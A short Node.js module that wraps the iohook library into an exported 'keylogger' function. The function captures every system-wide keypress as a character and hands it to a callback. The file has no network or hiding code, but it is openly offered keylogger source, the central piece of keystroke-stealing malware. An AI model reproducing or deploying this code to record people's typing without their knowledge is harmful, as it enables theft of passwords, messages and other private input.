const ioHook = require('iohook');

const keylogger = (callback) => {
    ioHook.on("keypress", event => {
        //console.log(String.fromCharCode(event.keychar));
        if(callback) callback(String.fromCharCode(event.keychar));
    });
    
    ioHook.start();
}

module.exports = { keylogger };